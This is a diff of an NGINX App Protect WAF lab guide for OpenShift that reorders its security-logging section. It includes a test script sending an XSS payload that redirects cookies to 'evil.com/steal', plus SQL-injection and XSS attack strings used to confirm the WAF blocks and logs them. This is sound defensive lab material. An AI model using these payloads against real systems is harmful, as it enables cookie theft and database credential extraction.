@@ -49,15 +49,91 @@ results.
 
 Congratulations on securing your application!
 
-*Here are some optional attacks you can try (Optional)*
 
-[NOTE]
-.Note
-====
-Execute the attack by appending the following string:
-`?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+` to the end of
-the application URL.
-====
+
+=== Security Logging
+
+To verify that F5 Application Protection WAF is logging security events,
+follow these steps:
+
+Events are logged in the local syslog pod.
++
+In the terminal window, copy the below text and press enter.
+
+[source,bash]
+----
+oc get pod -o wide
+----
+
+Example:
+
+[source,bash]
+----
+[lab-user@bastion app-protect-waf]$ oc get pod -o wide
+NAME                       READY   STATUS    RESTARTS   AGE   IP            NODE                                         NOMINATED NODE   READINESS GATES
+app2-6bd5b4fbd7-fdcp2      1/1     Running   0          70m   10.128.2.51   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
+app3-5699b95596-2fvgv      1/1     Running   0          70m   10.128.2.52   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
+backend-79c6bcf85c-9zdhl   1/1     Running   0          70m   10.129.2.41   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>
+main-584fc64db4-kz5c8      1/1     Running   0          70m   10.131.0.22   ip-10-0-223-88.us-east-2.compute.internal    <none>           <none>
+syslog-bb47bd798-mhh64     1/1     Running   0          25m   10.129.2.46   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>
+----
+
+
+Next, let's create an attack and then examine the logs.
+
+
+Create this bash script.  We'll use it to create the attack and then display the log.
+
+[source,sh,role=execute]
+----
+cat << 'EOF' > check_waf.sh
+#!/bin/bash
+
+echo "Sending a malicious request to trigger App Protect..."
+response=$(curl -sk "http://$nginx_ingress?item='><script>document.location='http://evil.com/steal'+document.cookie</script>")
+
+echo "Full WAF response:"
+echo "$response"
+
+support_id=$(echo "$response" | grep -oP 'support ID is: \K[0-9]+')
+echo "Captured Support ID: $support_id"
+
+syslog_pod=$(oc get pods --no-headers | grep '^syslog-' | cut -d' ' -f1)
+echo "Querying syslog pod $syslog_pod for WAF log entry..."
+
+oc exec -it pod/$syslog_pod -- cat /var/log/messages | \
+  grep "$support_id" | \
+  sed -n 's/.*json_log="\({.*}\)".*/\1/p' | \
+  sed 's/""/"/g' | jq .
+EOF
+----
+
+Make the script executable and then run it.
+
+[source,sh,role=execute]
+----
+chmod +x check_waf.sh && ./check_waf.sh
+----
+
+After running the `check_waf.sh` script, look at the parsed JSON and verify the following:
+
+- `"id"`: This should match the support ID you received in the curl response.
+- `"requestStatus": "blocked"`: Confirms the request was blocked by App Protect.
+- `"attackType"`: Look for entries like `"Cross Site Scripting (XSS)"`, showing the attack was correctly classified.
+- `"violation.name"`: Confirm detection of signatures such as `"VIOL_ATTACK_SIGNATURE"` or `"VIOL_PARAMETER_VALUE_METACHAR"`.
+- `"signature.name"`: Example: `"XSS script tag (Parameter)"` shows the specific rule triggered.
+- `"enforcementState.isBlocked": true`: Confirms blocking action was enforced.
+- `"observedEntity.value"`: This may show a base64-encoded version of the payload that triggered the violation.
+
+
+Congratulations on completing the Lab! You have learned how to deploy
+the NGINX App Protect WAF in OpenShift and how to use the NGINX App
+Protect WAF to protect your applications from attacks.
+
+*Here are some optional attacks you can try*
+
+Execute the attack by appending the string `?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+` to the end of the application URL.
+
 
 * SQL Injection - 
   `GET /?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+`
@@ -81,7 +157,7 @@ the application URL.
 * Cross-Site Scripting - 
   `GET / HTTP/1.1\r\nHost: <ATTACKED HOST>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n`
 
-*and many more from the bash script below (Just for your information)*
+*and many more from the bash script below*
 
 [NOTE]
 .Note
@@ -145,82 +221,3 @@ echo "--------------------------------------------------------------------------
 # Send a request with cross-site scripting payload
 curl -k "http://$EXTERNAL_IP/%25%25252541PPDATA%25"
 ----
-
-=== Security Logging
-
-To verify that F5 Application Protection WAF is logging security events,
-follow these steps:
-
-Events are logged in the local syslog pod.
-+
-In the terminal window, copy the below text and press enter.
-
-[source,bash]
-----
-oc get pod -o wide
-----
-
-Example:
-
-[source,bash]
-----
-[lab-user@bastion app-protect-waf]$ oc get pod -o wide
-NAME                       READY   STATUS    RESTARTS   AGE   IP            NODE                                         NOMINATED NODE   READINESS GATES
-app2-6bd5b4fbd7-fdcp2      1/1     Running   0          70m   10.128.2.51   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
-app3-5699b95596-2fvgv      1/1     Running   0          70m   10.128.2.52   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
-backend-79c6bcf85c-9zdhl   1/1     Running   0          70m   10.129.2.41   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>
-main-584fc64db4-kz5c8      1/1     Running   0          70m   10.131.0.22   ip-10-0-223-88.us-east-2.compute.internal    <none>           <none>
-syslog-bb47bd798-mhh64     1/1     Running   0          25m   10.129.2.46   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>
-----
-+
-Next, let's create an attack and then examine the logs.
-+
-
-Create this bash script.  We'll use it to create the attack and then display the log.
-
-[source,sh,role=execute]
-----
-cat << 'EOF' > check_waf.sh
-cat << 'EOF' > check_waf.sh
-#!/bin/bash
-
-echo "Sending a malicious request to trigger App Protect..."
-response=$(curl -sk "http://$nginx_ingress?item='><script>document.location='http://evil.com/steal'+document.cookie</script>")
-
-echo "Full WAF response:"
-echo "$response"
-
-support_id=$(echo "$response" | grep -oP 'support ID is: \K[0-9]+')
-echo "Captured Support ID: $support_id"
-
-syslog_pod=$(oc get pods --no-headers | grep '^syslog-' | cut -d' ' -f1)
-echo "Querying syslog pod $syslog_pod for WAF log entry..."
-
-oc exec -it pod/$syslog_pod -- cat /var/log/messages | \
-  grep "$support_id" | \
-  sed -n 's/.*json_log="\({.*}\)".*/\1/p' | \
-  sed 's/""/"/g' | jq .
-EOF
-----
-
-Make the script executable and then run it.
-
-[source,sh,role=execute]
-----
-chmod +x check_waf.sh && ./check_waf.sh
-----
-
-After running the check_waf.sh script, look at the parsed JSON and verify the following:
-
-- `"id"`: This should match the support ID you received in the curl response.
-- `"requestStatus": "blocked"`: Confirms the request was blocked by App Protect.
-- `"attackType"`: Look for entries like `"Cross Site Scripting (XSS)"`, showing the attack was correctly classified.
-- `"violation.name"`: Confirm detection of signatures such as `"VIOL_ATTACK_SIGNATURE"` or `"VIOL_PARAMETER_VALUE_METACHAR"`.
-- `"signature.name"`: Example: `"XSS script tag (Parameter)"` shows the specific rule triggered.
-- `"enforcementState.isBlocked": true`: Confirms blocking action was enforced.
-- `"observedEntity.value"`: This may show a base64-encoded version of the payload that triggered the violation.
-
-
-Congratulations on completing the Lab! You have learned how to deploy
-the NGINX App Protect WAF in OpenShift and how to use the NGINX App
-Protect WAF to protect your applications from attacks.
